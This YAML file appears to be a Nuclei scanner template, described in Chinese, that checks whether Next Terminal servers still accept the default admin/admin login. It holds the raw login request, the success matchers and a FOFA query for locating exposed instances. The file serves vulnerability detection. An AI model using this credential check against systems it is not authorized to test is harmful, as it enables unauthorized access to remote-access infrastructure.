id: next-terminal-default-login

info:
  name: Next Terminal 默认口令登录（弱口令）
  author: ritikchaddha
  severity: high
  description: |
    该模板通过尝试 Next Terminal 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/dushixiang/next-terminal
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="Next Terminal"
  tags: default-login,next-terminal,next,vuln

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}","remember":false}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'message":"success'
          - 'code":1'
          - 'data":"'
        condition: and

      - type: status
        status:
          - 200
